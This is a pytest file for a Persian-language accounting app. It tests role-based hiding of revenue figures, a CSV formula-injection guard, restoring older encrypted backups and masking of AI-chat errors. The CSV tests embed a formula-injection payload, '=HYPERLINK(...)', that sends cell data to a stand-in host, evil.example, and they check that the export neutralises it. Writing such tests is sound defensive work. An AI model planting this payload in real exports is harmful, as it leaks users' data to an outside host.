"""Money figures by role, CSV formula guard and restoring an older backup (group G3).
Users start with g3_, mobiles with 0915103."""
import csv
import gzip
import hashlib
import io
import json
import os
import sqlite3
import tempfile
from contextlib import closing, contextmanager
from datetime import date, timedelta
from pathlib import Path

from fastapi.testclient import TestClient
from sqlalchemy import inspect

from app.api.system import CSV_HEAD, DAY_MONEY, TODAY_FOR_ALL, csv_text
from app.core import db as dbmod
from app.core.config import get_settings
from app.main import app
from app.plugins.manager import manager
from app.services import backup as backup_mod

MONEY_TODAY = {"revenue", "expenses", "cogs", "product_revenue", "product_profit", "forfeited", "profit", "net_profit",
               "cash_in", "cash_received", "cash_paid_back", "deposits_received", "receivable", "discounts", "avg_ticket",
               "by_line", "by_account", "by_staff", "top_services", "expense_by_category"}


def _as_role(client, name, role):
    r = client.post("/api/auth/users", json={"username": name, "password": "Passw0rd1", "role": role})
    assert r.status_code == 200, r.text
    c = TestClient(app)
    tok = c.post("/api/auth/login", json={"username": name, "password": "Passw0rd1"}).json()["access_token"]
    c.headers["Authorization"] = f"Bearer {tok}"
    return c


def _invoice(client, accounts, services, name, mobile, price, paid, description=None):
    c = client.post("/api/customers", json={"full_name": name, "mobile": mobile}).json()
    item = {"service_id": services["مانیکور"]["id"], "unit_price": price} | ({"description": description} if description else {})
    r = client.post("/api/invoices", json={"customer_id": c["id"], "items": [item],
                                           "payments": [{"payment_account_id": accounts["کارتخوان ملت"], "amount": paid}] if paid else []})
    assert r.status_code == 200, r.text
    return c, r.json()


# ---------------------------------------------------------------- dashboard / day / invoice list by role
def test_reception_and_staff_get_the_days_work_not_its_money(client, accounts, services):
    rec = _as_role(client, "g3_rec", "receptionist")
    staff = _as_role(client, "g3_staff", "staff")
    before_owner = client.get("/api/dashboard").json()["today"]
    before_rec = rec.get("/api/dashboard").json()["today"]
    _, inv = _invoice(client, accounts, services, "مشتری نقش‌ها", "09151030001", 3_000_000, 1_000_000)

    owner = client.get("/api/dashboard").json()
    assert owner["today"]["revenue"] == before_owner["revenue"] + 3_000_000  # the owner still sees the money, to the Rial
    assert owner["today"]["cash_in"] == before_owner["cash_in"] + 1_000_000
    assert "month" in owner and "series" in owner
    for c in (rec, staff):
        d = c.get("/api/dashboard").json()
        assert set(d["today"]) <= set(TODAY_FOR_ALL) and not (MONEY_TODAY & set(d["today"]))
        assert not {"month", "previous", "series", "money_returned", "insights"} & set(d)
        assert d["today"]["invoice_count"] == owner["today"]["invoice_count"]  # the day's work is the same number
        assert d["today"]["deposits_held"] == owner["today"]["deposits_held"]  # open deposits: reception handles them
        assert "agenda" in d and "alerts" in d
    assert rec.get("/api/dashboard").json()["today"]["invoice_count"] == before_rec["invoice_count"] + 1
    # the owner's own reports stay closed to them
    assert rec.get("/api/reports/summary").status_code == 403 and staff.get("/api/reports/summary").status_code == 403


def test_day_details_today_only_and_without_money_for_reception(client, accounts, services):
    rec = TestClient(app)
    rec.headers["Authorization"] = "Bearer " + rec.post("/api/auth/login", json={"username": "g3_rec", "password": "Passw0rd1"}).json()["access_token"]
    staff = _as_role(client, "g3_staff2", "staff")
    _, inv = _invoice(client, accounts, services, "مشتری جزئیات روز", "09151030002", 2_500_000, 2_500_000)
    yesterday = (date.today() - timedelta(days=1)).isoformat()
    for c in (rec, staff):
        d = c.get("/api/dashboard/day").json()
        assert not set(DAY_MONEY) & set(d)
        assert any(i["number"] == inv["number"] for i in d["invoices"]) and d["invoice_count"] >= 1
        assert c.get("/api/dashboard/day", params={"day": date.today().isoformat()}).status_code == 200
        r = c.get("/api/dashboard/day", params={"day": yesterday})
        assert r.status_code == 403 and "امروز" in r.json()["detail"]
    full = client.get("/api/dashboard/day").json()
    assert set(DAY_MONEY) <= set(full) and any(m["amount"] == 2_500_000 and m["ref"] == inv["number"] for m in full["money"])
    assert client.get("/api/dashboard/day", params={"day": yesterday}).status_code == 200


def test_invoice_list_headline_counts_only_for_reception(client, accounts, services):
    rec = TestClient(app)
    rec.headers["Authorization"] = "Bearer " + rec.post("/api/auth/login", json={"username": "g3_rec", "password": "Passw0rd1"}).json()["access_token"]
    owner0 = client.get("/api/invoices/search", params={"limit": 1}).json()["stats"]
    _, inv = _invoice(client, accounts, services, "مشتری سرجمع", "09151030003", 4_000_000, 1_500_000)
    owner = client.get("/api/invoices/search", params={"limit": 1}).json()
    assert owner["stats"]["today"] == [owner0["today"][0] + 1, owner0["today"][1] + 4_000_000]
    assert owner["stats"]["unpaid"] == [owner0["unpaid"][0] + 1, owner0["unpaid"][1] + 2_500_000]
    r = rec.get("/api/invoices/search", params={"limit": 1}).json()
    for k in ("today", "week", "month"):
        assert r["stats"][k] == [owner["stats"][k][0], None]  # how many invoices, not how much was sold
    assert r["stats"]["unpaid"] == owner["stats"]["unpaid"]  # what is left to collect: reception's follow-up
    assert r["amount"] is None and r["paid"] is None and r["due"] is None and r["total"] == owner["total"]
    # the rows themselves are unchanged (reception works with each invoice)
    one = rec.get("/api/invoices/search", params={"q": inv["number"]}).json()
    assert one["items"][0]["total"] == 4_000_000 and one["items"][0]["due"] == 2_500_000
    own = client.get("/api/invoices/search", params={"q": inv["number"]}).json()
    assert (own["amount"], own["paid"], own["due"]) == (4_000_000, 1_500_000, 2_500_000)


# ---------------------------------------------------------------- CSV formula guard
def test_csv_text_guard():
    for bad in ("=HYPERLINK(\"x\")", "+1", "-2+3", "@SUM(A1)", "\tx", "\rx"):
        assert csv_text(bad) == "'" + bad
    assert csv_text("سارا") == "سارا" and csv_text("") == "" and csv_text(None) is None
    assert csv_text(-5_000) == -5_000 and csv_text(0) == 0  # numbers (a negative amount too) stay numbers


def test_sales_export_neutralises_formula_names(client, accounts, services):
    evil = '=HYPERLINK("http://evil.example/?d="&B2,"جزئیات")'
    _, inv = _invoice(client, accounts, services, evil, "09151030004", 1_200_000, 0, description="-تخفیف=1+1")
    r = client.get("/api/reports/export.csv", params={"start": date.today().isoformat(), "end": date.today().isoformat()})
    assert r.status_code == 200
    head = {v: k for k, v in CSV_HEAD.items()}  # the file's columns are in Persian
    rows = [{head[k]: v for k, v in x.items()} for x in csv.DictReader(io.StringIO(r.text.lstrip("﻿")))]
    mine = [x for x in rows if x["number"] == inv["number"]]
    assert len(mine) == 1
    assert mine[0]["customer"] == "'" + evil and mine[0]["service"] == "'-تخفیف=1+1"
    assert mine[0]["unit_price"] == "1200000" and mine[0]["qty"] == "1"  # numbers untouched
    assert not any(v.startswith(("=", "+", "-", "@")) for x in rows for v in x.values() if v)


# ---------------------------------------------------------------- restoring an older backup
@contextmanager
def _own_db():
    """A copy of the shared test database served while the test runs, so a restore never touches the others' data."""
    original = str(dbmod.engine.url)
    path = Path(tempfile.mkdtemp(prefix="g3-")) / "live.db"
    backup_mod._copy_db(backup_mod._sqlite_path(), path)
    saved = {n: (manager.enabled.get(n), p.ctx.config) for n, p in manager.plugins.items()}
    dbmod.reconfigure(f"sqlite:///{path}")
    try:
        yield path
    finally:
        dbmod.reconfigure(original)
        for n, (en, cfg) in saved.items():
            manager.enabled[n] = en
            manager.plugins[n].ctx.config = cfg


def _old_copy(live: Path, plugin: str, enabled: bool) -> bytes:
    """The database as an older version left it: no trade_docs table (before 1.19), an index missing, and its own
    plugin choice."""
    old = live.parent / "old.db"
    backup_mod._copy_db(live, old)
    with closing(sqlite3.connect(old)) as con:
        con.execute("PRAGMA foreign_keys=OFF")
        con.execute("UPDATE trade_history SET doc_id = NULL")
        con.execute("DROP TABLE trade_docs")
        con.execute("DROP INDEX IF EXISTS ix_cust_name")
        con.execute("INSERT OR REPLACE INTO plugin_states (name, enabled, config) VALUES (?, ?, ?)",  # a data reset removes the rows
                    (plugin, enabled, json.dumps({"g3_marker": "از پشتیبان"})))
        con.commit()
    return old.read_bytes()


def _hbk(raw: bytes) -> bytes:
    salt = os.urandom(16)
    return backup_mod.MAGIC + salt + backup_mod._fernet(salt).encrypt(gzip.compress(raw))


def _tables_and_indexes():
    insp = inspect(dbmod.engine)
    return set(insp.get_table_names()), {i["name"] for i in insp.get_indexes("customers")}


def test_restoring_an_older_backup_upgrades_it_and_loads_its_plugin_settings(client):
    cust = client.post("/api/customers", json={"full_name": "مشتری بازگردانی", "mobile": "09151030005"}).json()
    pname = sorted(manager.plugins)[0]
    with _own_db() as live:
        was = bool(manager.enabled.get(pname))
        raw = _old_copy(live, pname, not was)
        name = "hesabdar-g3old-named"
        s = get_settings()
        (s.backup_dir / f"{name}.hbk").write_bytes(_hbk(raw))
        (s.backup_dir / f"{name}.json").write_text(json.dumps({"name": name, "file": f"{name}.hbk", "created_at": "2026-01-01T00:00:00",
                                                                "reason": "g3", "sha256": hashlib.sha256(raw).hexdigest()}))
        r = client.post(f"/api/backups/{name}/restore")
        assert r.status_code == 200, r.text
        assert "warning" not in r.json()
        tables, idx = _tables_and_indexes()
        assert "trade_docs" in tables and "ix_cust_name" in idx  # added again, as at start-up
        assert client.get(f"/api/customers/{cust['id']}").status_code == 200  # was 500 «no such table: trade_docs»
        assert manager.enabled[pname] is (not was)  # the backup's own plugin choice, without a restart
        assert manager.plugins[pname].ctx.config.get("g3_marker") == "از پشتیبان"
        log = client.get("/api/audit", params={"limit": 5}).json()
        assert any(a["action"] == "backup.restore" and a["entity_id"] == name for a in log)
        assert client.get("/api/audit/verify").json()["ok"]


def test_upload_restore_is_upgraded_and_audited(client):
    cust = client.post("/api/customers", json={"full_name": "مشتری بارگذاری", "mobile": "09151030006"}).json()
    pname = sorted(manager.plugins)[0]
    with _own_db() as live:
        raw = _old_copy(live, pname, bool(manager.enabled.get(pname)))
        r = client.post("/api/backups/upload-restore", files={"file": ("g3-upload.hbk", _hbk(raw), "application/octet-stream")},
                        data={"passphrase": ""})
        assert r.status_code == 200, r.text
        assert r.json()["restored"] == "g3-upload.hbk" and r.json()["uploaded"] is True
        tables, idx = _tables_and_indexes()
        assert "trade_docs" in tables and "ix_cust_name" in idx
        assert client.get(f"/api/customers/{cust['id']}").status_code == 200
        log = client.get("/api/audit", params={"limit": 5}).json()
        mine = [a for a in log if a["action"] == "backup.restore" and a["entity_id"] == "g3-upload.hbk"]
        assert mine and mine[0]["data"]["uploaded"] is True and mine[0]["actor"] == "owner"
        # a wrong file is refused and nothing is restored
        bad = client.post("/api/backups/upload-restore", files={"file": ("x.hbk", b"not a backup", "application/octet-stream")})
        assert bad.status_code == 400


def test_restoring_a_backup_from_before_the_fix_mends_its_audit_links(client):
    """A backup of 1.19 can hold records the old bug linked to the wrong earlier record: restoring it mends them once
    (as the first start of 1.20.0 does), so Settings > Security does not say "tampered"."""
    from sqlalchemy import create_engine, select
    from sqlalchemy.orm import Session

    from app.models import AuditLog, Setting
    from app.services.audit import RECHAIN_FLAG, _digest

    client.post("/api/customers", json={"full_name": "مشتری زنجیره", "mobile": "09151030007"})
    with _own_db() as live:
        old = live.parent / "chain.db"
        backup_mod._copy_db(live, old)
        eng = create_engine(f"sqlite:///{old}")
        with Session(eng) as db:
            last, before = db.scalars(select(AuditLog).order_by(AuditLog.id.desc()).limit(2)).all()
            last.prev_hash = before.prev_hash  # the old bug: linked to the same record as the one before it
            last.hash = _digest(last.prev_hash, last)
            flag = db.get(Setting, RECHAIN_FLAG)
            if flag is not None:
                db.delete(flag)  # a database of 1.19 never had the flag
            db.commit()
            bad_id = last.id
        eng.dispose()
        r = client.post("/api/backups/upload-restore", files={"file": ("g3-chain.hbk", _hbk(old.read_bytes()), "application/octet-stream")})
        assert r.status_code == 200 and "warning" not in r.json(), r.text
        v = client.get("/api/audit/verify").json()
        assert v["ok"], v
        log = client.get("/api/audit", params={"limit": 10}).json()
        assert any(a["action"] == "audit.rechain" and bad_id in a["data"]["ids"] for a in log)


def test_restored_backup_without_a_plugins_row_gives_it_its_first_start_state(client):
    from app.core.db import SessionLocal
    from app.models import PluginState

    with _own_db() as live:
        old = live.parent / "noplugin.db"
        backup_mod._copy_db(live, old)
        with closing(sqlite3.connect(old)) as con:
            con.execute("DELETE FROM plugin_states WHERE name = 'messaging_receipts'")  # a backup from before this plugin
            con.commit()
        manager.enabled["messaging_receipts"] = True  # on here, now
        r = client.post("/api/backups/upload-restore", files={"file": ("g3-noplugin.hbk", _hbk(old.read_bytes()), "application/octet-stream")})
        assert r.status_code == 200 and "warning" not in r.json(), r.text
        assert manager.enabled["messaging_receipts"] is False  # off, as on a new install (not the old in-memory choice)
        with SessionLocal() as db:
            st = db.get(PluginState, "messaging_receipts")
            assert st is not None and st.enabled is False  # the page and the database agree
        assert next(p for p in client.get("/api/plugins").json() if p["name"] == "messaging_receipts")["enabled"] is False


# ---------------------------------------------------------------- AI chat errors
def test_ai_chat_error_shows_a_code_not_the_details(client, monkeypatch, caplog):
    import re

    from app.ai import assistant

    def boom(db, user, messages):  # noqa: ANN001, ANN202
        raise RuntimeError("(sqlite3.OperationalError) SELECT password_hash FROM users WHERE id = 1")

    monkeypatch.setattr(assistant, "chat", boom)
    with caplog.at_level("ERROR", logger="hesabdar.system"):
        r = client.post("/api/ai/chat", json={"messages": [{"role": "user", "content": "سلام"}]})
    assert r.status_code == 502
    detail = r.json()["detail"]
    assert "SELECT" not in detail and "password" not in detail and "sqlite" not in detail
    code = re.search(r"کد ([0-9a-f]{6})", detail).group(1)
    assert any(code in rec.getMessage() and rec.exc_info for rec in caplog.records)  # the details are in the log
